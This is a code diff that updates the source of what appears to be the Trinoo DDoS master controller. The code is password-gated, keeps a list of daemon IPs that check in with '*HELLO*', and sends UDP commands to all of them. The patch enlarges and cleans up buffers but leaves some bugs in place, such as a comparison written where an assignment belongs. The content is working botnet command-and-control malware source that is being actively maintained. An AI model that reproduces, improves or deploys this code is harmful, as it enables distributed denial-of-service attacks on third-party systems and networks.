@@ -47,7 +47,7 @@
 	}
 
 int checkonip(char *);
-int sendtolist(int, char *, int);
+void sendtolist(int, char *, int);
 
 #ifdef CRYPTKEY
 char *encrypt_string(char *, char *);
@@ -63,13 +63,12 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 	unsigned int i;
 	int pongr = 0;
 	FILE *out;
-	char buf[1024], outbuf[1024], old, comm[15], *arg1;
+	char buf[BUFSIZ], outbuf[BUFSIZ], comm[15], *arg1;
 	char pass[8], *dec, *enc;
 	struct in_addr lookip;
 	fd_set myfds;
 	struct timeval tv;
 	struct hostent *he;
-	old = 0 - 28;
 	if (argv[1]) {
 		if (strcmp(argv[1], "---v") == 0) {
 			printf("trinoo %s\n", VERSION);
@@ -86,7 +85,7 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 		exit(-1);
 	}
 	printf("?? ");
-	Fgets(buf, 1024, stdin);
+	Fgets(buf, sizeof(buf), stdin);
 	buf[strlen(buf) - 1] = 0;
 	if (strcmp((char *)crypt(buf, "0n"), "0nm1VNMXqRMyM") != 0) {
 		exit(-1);
@@ -128,14 +127,12 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 			FD_SET(bewm, &myfds);
 		if (select(FD_SETSIZE, &myfds, NULL, NULL, &tv)) {
 			if (FD_ISSET(sock, &myfds)) {
-				bzero(buf, 1024);
+				bzero(buf, sizeof(buf));
 				fromlen = sizeof(from);
-				if ((numread == recvfrom(sock, buf, 1024, 0, (struct sockaddr *)&from, &fromlen)) == -1) {
+				if ((numread == recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fromlen)) == -1) {
 					perror("read");
 					continue;
 				}
-				if (buf[0] == old)
-					sprintf(buf, "*HELLO*");
 				if (strcmp("*HELLO*", buf) == 0) {
 					if (checkonip((char *)inet_ntoa(from.sin_addr)) > 0) {
 						out = fopen(OUTFILE, "a");
@@ -180,8 +177,8 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 				}
 			}
 			if (FD_ISSET(bewm, &myfds)) {
-				bzero(buf, 1024);
-				numread = read(bewm, buf, 1024);
+				bzero(buf, sizeof(buf));
+				numread = read(bewm, buf, sizeof(buf));
 				if (numread < 1) {
 					close(bewm);
 					bewm = 0;
@@ -218,11 +215,10 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 						}
 					} else {
 						blist = 0;
-						while (fgets(outbuf, 1024, out)
+						while (fgets(outbuf, sizeof(buf), out)
 						       != NULL) {
 							if (outbuf[strlen(outbuf)] == '\n')
-								outbuf[strlen(outbuf)
-								       - 1] = 0;
+								outbuf[strlen(outbuf)-1] = 0;
 #ifdef CRYPTKEY
 							dec = decrypt_string(decrypt_string("bored", CRYPTKEY), outbuf);
 							sprintf(outbuf, "%s\n", dec);
@@ -440,11 +436,11 @@ int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused))
 int checkonip(char *ip)
 {
 	int blah = 0;
-	char buf[1024], *dec;
+	char buf[BUFSIZ], *dec;
 	FILE *out;
 	out = fopen(OUTFILE, "r");
 	if (out != NULL) {
-		while (fgets(buf, 1024, out) != NULL) {
+		while (fgets(buf, sizeof(buf), out) != NULL) {
 			if (buf[strlen(buf) - 1] == '\n')
 				buf[strlen(buf) - 1] = '\0';
 #ifdef CRYPTKEY
@@ -462,11 +458,11 @@ int checkonip(char *ip)
 		return 1;
 }
 
-int sendtolist(int port, char *outbuf, int len)
+void sendtolist(int port, char *outbuf, int len)
 {
 	struct sockaddr_in out;
 	int sock;
-	char buf[1024], *dec;
+	char buf[BUFSIZ], *dec;
 	FILE *outread;
 	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 	out.sin_family = AF_INET;
@@ -474,7 +470,7 @@ int sendtolist(int port, char *outbuf, int len)
 
 	outread = fopen(OUTFILE, "r");
 	if (outread) {
-		while (fgets(buf, 1024, outread) != NULL) {
+		while (fgets(buf, sizeof(buf), outread) != NULL) {
 			if (buf[strlen(buf) - 1] == '\n')
 				buf[strlen(buf) - 1] = '\0';
 #ifdef CRYPTKEY
@@ -489,6 +485,4 @@ int sendtolist(int port, char *outbuf, int len)
 		fclose(outread);
 	}
 	close(sock);
-
-	return 0;
 }
